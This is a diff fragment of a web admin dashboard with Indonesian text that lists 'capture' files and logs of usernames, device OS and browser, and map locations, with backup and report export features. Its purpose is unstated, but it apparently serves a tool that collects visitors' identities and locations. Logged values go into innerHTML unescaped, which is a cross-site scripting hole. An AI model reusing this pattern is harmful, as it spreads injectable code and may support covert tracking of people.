+  if (!confirm(`Hapus ${filename}?`)) return;
+  try {
+    const res = await fetch(`/api/capture/${filename}`, { method: 'DELETE' });
+    if (res.status === 401) { window.location.href = '/admin/login'; return; }
+    if (!res.ok) throw new Error('Gagal hapus');
+    await refreshData();
+  } catch (e) { alert('Gagal hapus: ' + e.message); }
+}
+
+function renderLogs() {
+  const container = document.getElementById('logsContainer');
+  if (allLogs.length === 0) { container.textContent = 'Belum ada log.'; return; }
+  const recent = allLogs.slice(-20).reverse();
+  container.innerHTML = `
+    <table>
+      <thead><tr><th>Waktu</th><th>Username</th><th>OS</th><th>Browser</th><th>Lokasi</th></tr></thead>
+      <tbody>
+        ${recent.map(l => `
+          <tr>
+            <td>${l.timestamp ? new Date(l.timestamp).toLocaleString('id-ID') : '-'}</td>
+            <td>${l.username || '-'}</td>
+            <td>${l.device?.os || '-'}</td>
+            <td>${l.device?.browser || '-'}</td>
+            <td>${l.location?.mapsLink ? `<a href="${l.location.mapsLink}" target="_blank">📍 Maps</a>` : '-'}</td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+}
+
+// ============ AUTO-BACKUP UI ============
+async function loadBackups() {
+  try {
+    const res = await fetch('/api/backups');
+    if (res.status === 401) return;
+    const data = await res.json();
+    const container = document.getElementById('backupList');
+    if (data.length === 0) {
+      container.innerHTML = '<div style="padding:16px;text-align:center;color:var(--text-muted);font-size:13px;">Belum ada auto-backup. Backup pertama akan dibuat otomatis setelah 1 jam server jalan, atau klik "Buat Sekarang".</div>';
+      return;
+    }
+    container.innerHTML = data.map(b => `
+      <div class="backup-item">
+        <div>
+          <span class="name">${b.filename}</span>
+          <span class="size">${(b.size/1024).toFixed(1)} KB</span>
+        </div>
+        <div class="actions">
+          <a href="/api/backups/${b.filename}" download>📥 Download</a>
+        </div>
+      </div>
+    `).join('');
+  } catch (e) { console.error(e); }
+}
+
+async function createManualBackup() {
+  if (!confirm('Buat auto-backup sekarang?')) return;
+  try {
+    const res = await fetch('/api/backups/create', { method: 'POST' });
+    if (res.ok) {
+      showToast('✅ Backup Dibuat', 'Auto-backup berhasil dibuat', '💾');
+      loadBackups();
+    } else {
+      showToast('❌ Gagal', 'Backup gagal dibuat', '⚠️');
+    }
+  } catch (e) {
+    showToast('❌ Gagal', e.message, '⚠️');
+  }
+}
+
+// ============ EXPORT PDF (via print) ============
+function exportPDF() {
+  const originalTitle = document.title;
+  document.title = 'Capture Report - ' + new Date().toISOString().split('T')[0];
+  setTimeout(() => {
+    window.print();
+    document.title = originalTitle;
+  }, 100);
+}
+
+// ============ INIT ============
+document.getElementById('search').addEventListener('input', renderGrid);
+['filterFrom','filterTo','filterOS','filterBrowser'].forEach(id => {
+  document.getElementById(id).addEventListener('change', renderGrid);
+});
+
+refreshData();
+setInterval(refreshData, 5000);
+
+// Register service worker (PWA)
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').catch(e => console.log('SW not supported'));
+}
+</script>
+</body>
+</html>
